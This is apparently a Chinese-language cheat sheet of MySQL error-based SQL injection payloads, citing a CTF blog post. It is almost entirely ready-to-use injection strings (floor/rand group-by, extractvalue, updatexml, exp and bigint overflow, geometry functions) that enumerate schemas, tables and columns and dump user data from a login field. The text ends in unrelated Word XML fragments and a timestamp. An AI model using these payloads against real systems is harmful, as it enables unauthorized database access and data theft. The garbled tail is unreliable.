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http://hebin.me/2017/12/04/%E8%A5%BF%E6%99%AEctf-%E5%8A%A0%E4%BA%86%E6%96%99%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/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https://www.cnblogs.com/Dleo/p/5493782.html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获得数据库数量：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(select 1 from(select count(*),concat((select (select (select concat(0x7e7e3a7e7e,count(distinct table_schema),0x7e7e3a7e7e) from information_schema.tables))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一个个获取数据库的名称 limit 0,1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(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e,table_schema,0x7e7e3a7e7e) from information_schema.tables limit 0,1))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获取表的数量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(select 1 from(select count(*),concat((select (select (select count(table_name)from information_schema.tables where table_schema=))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挨个取得表名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(select 1 from(select count(*),concat((select (select (select concat(table_name,0x20) from information_schema.tables where table_schema="security" limit 0,1))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 获得列名和表名  security.users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(select 1 from(select count(*),concat((select (select (select concat(column_name,0x20) from information_schema.columns where table_name=0x6d6f74746f limit 0,1))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先爆个数据库助助兴，拿到当前数据库mydbs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username=admin' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e)))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接着开始跑表，改变limit后面的数字就能遍历所有表：log，motto，user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username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1))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爆motto表中的列：id，username，motto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username=admin' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x6d6f74746f LIMIT 0,1))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爆字段：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常规语句：and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,motto,0x23) FROM motto limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23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ExtractValue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username=admin' and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,motto,0x23) FROM motto limit 0,1)))%23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updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,motto,0x23) FROM motto limit 0,1),0x7e),1)%23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exp溢出注入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exp(~(select*from(select user())x))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exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x))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bigint溢出注入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!(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;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extractvalue()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1 and (extractvalue(1, concat(0x5c,(select user()))))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analyse(extractvalue(rand(),concat(0x3a,(select distinct concat(0x7e,table_name,0x7e)from information_schema.tables where table_schema=database() limit 0,1))),1)%23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updatexml()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1 and (updatexml(0x3a,concat(1,(select user())),1))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schema_name from information_schema.schemata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 from information_schema.tables where table_schema=’xxxxx’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 from information_schema.columns where table_name=’xxxxx’ and table_schema=""  schema_name=""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*** from ****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GeometryCollection()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1 AND GeometryCollection((select * from (select * from(select user())a)b))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polygon()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=1 AND polygon((select * from(select * from(select user())a)b))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multipoint()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1 AND multipoint((select * from(select * from(select user())a)b))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multilinestring()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1 AND multilinestring((select * from(select * from(select user())a)b))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linestring()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1 AND LINESTRING((select * from(select * from(select user())a)b))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multipolygon()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=1 AND multipolygon((select * from(select * from(select user())a)b))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615363F6"/>
    <w:rsid w:val="697312E3"/>
    <w:rsid w:val="6AC353B0"/>
    <w:rsid w:val="6CD23A5A"/>
    <w:rsid w:val="6D535020"/>
    <w:rsid w:val="6DE416DF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2019-03-12T05:02:56Z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